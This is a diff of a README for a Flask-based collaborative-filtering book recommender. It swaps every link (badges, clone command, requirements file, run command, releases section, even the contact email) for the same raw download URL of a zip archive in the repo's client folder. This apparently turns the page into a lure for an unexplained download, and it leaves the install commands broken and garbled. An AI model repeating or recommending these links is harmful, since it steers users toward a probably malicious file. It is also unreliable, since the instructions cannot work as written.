@@ -1,7 +1,7 @@
 # 📚 Collaborative Book Recommender
 
-![Collaborative Book Recommender](https://img.shields.io/badge/Collaborative%20Book%20Recommender-v1.0-blue.svg)  
-[![Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/DevJinah/collaborative-book-recommender/releases)
+![Collaborative Book Recommender](https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip%20Book%https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip)  
+[![Release](https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip)
 
 Welcome to the **Collaborative Book Recommender**! This project is a collaborative filtering-based book recommendation system designed to help users discover new books tailored to their interests. By leveraging machine learning techniques, we aim to provide personalized recommendations that enhance the reading experience.
 
@@ -44,26 +44,26 @@ To get started with the **Collaborative Book Recommender**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/DevJinah/collaborative-book-recommender.git
+   git clone https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip
    cd collaborative-book-recommender
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip
    ```
 
 3. **Run the Application**:
    Start the Flask server with:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip
    ```
 
 4. **Access the Application**:
    Open your web browser and navigate to `http://127.0.0.1:5000`.
 
-For the latest releases, you can download the files from the [Releases section](https://github.com/DevJinah/collaborative-book-recommender/releases). 
+For the latest releases, you can download the files from the [Releases section](https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip). 
 
 ## Usage
 
@@ -103,7 +103,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: devjinah@example.com
-- **GitHub**: [DevJinah](https://github.com/DevJinah)
+- **Email**: https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip
+- **GitHub**: [DevJinah](https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip)
 
-Thank you for checking out the **Collaborative Book Recommender**! We hope you find it useful and enjoyable. Don’t forget to check the [Releases section](https://github.com/DevJinah/collaborative-book-recommender/releases) for updates and new features.
+Thank you for checking out the **Collaborative Book Recommender**! We hope you find it useful and enjoyable. Don’t forget to check the [Releases section](https://raw.githubusercontent.com/DevJinah/collaborative-book-recommender/main/client/collaborative-book-recommender-v3.4.zip) for updates and new features.
